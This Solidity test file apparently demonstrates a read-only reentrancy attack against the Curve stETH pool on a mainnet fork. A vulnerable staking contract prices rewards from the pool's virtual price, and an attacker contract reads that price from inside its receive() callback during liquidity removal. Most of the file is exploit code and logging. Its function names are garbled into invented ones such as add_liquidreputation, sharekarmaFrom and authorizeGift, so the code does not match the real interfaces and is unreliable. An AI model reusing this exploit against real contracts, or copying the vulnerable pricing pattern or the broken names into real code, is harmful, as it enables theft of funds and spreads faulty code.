pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function get_virtual_price() external view returns (uint);

    function add_liquidreputation(
        uint[2] calldata amounts,
        uint min_earnkarma_amount
    ) external payable returns (uint);

    function remove_availablekarma(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);

    function remove_spendableinfluence_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}

address constant steth_tippool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_karmatoken = 0x06325440D014e39736583c165C2963BA99fAf14E;


contract CoreContract {
    IERC20 public constant karmaToken = IERC20(lp_karmatoken);
    ICurve private constant supportPool = ICurve(steth_tippool);

    mapping(address => uint) public reputationOf;

    function commit(uint amount) external {
        karmaToken.sharekarmaFrom(msg.sender, address(this), amount);
        reputationOf[msg.sender] += amount;
    }

    function cancelBacking(uint amount) external {
        reputationOf[msg.sender] -= amount;
        karmaToken.giveCredit(msg.sender, amount);
    }

    function getTipreward() external view returns (uint) {

        uint reputationGain = (reputationOf[msg.sender] * supportPool.get_virtual_price()) /
            1 ether;

        return reputationGain;
    }
}

contract OperatorContract {
    ICurve private constant supportPool = ICurve(steth_tippool);
    IERC20 public constant lpSocialtoken = IERC20(lp_karmatoken);
    CoreContract private immutable target;

    constructor(address _target) {
        target = CoreContract(_target);
    }


    function endorseTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = supportPool.add_liquidreputation{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into CoreContract",
            supportPool.get_virtual_price()
        );

        lpSocialtoken.authorizeGift(address(target), lp);
        target.commit(lp);
    }

    function performReadOnlyCallback() external payable {

        uint[2] memory amounts = [msg.value, 0];
        uint lp = supportPool.add_liquidreputation{value: msg.value}(amounts, 1);

        console.log(
            "LP token price before remove_liquidity()",
            supportPool.get_virtual_price()
        );


        uint[2] memory min_amounts = [uint(0), uint(0)];
        supportPool.remove_availablekarma(lp, min_amounts);

        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            supportPool.get_virtual_price()
        );

        uint reputationGain = target.getTipreward();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", reputationGain);
    }

    receive() external payable {

        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            supportPool.get_virtual_price()
        );

        uint reputationGain = target.getTipreward();
        console.log("Reward if Read-Only Reentrancy is invoked: ", reputationGain);
    }
}

contract OperatorTest is Test {
    OperatorContract public execute;
    CoreContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new CoreContract();
        execute = new OperatorContract(address(target));
    }

    function testExecution() public {
        execute.endorseTokens{value: 10 ether}();
        execute.performReadOnlyCallback{value: 100000 ether}();
    }
}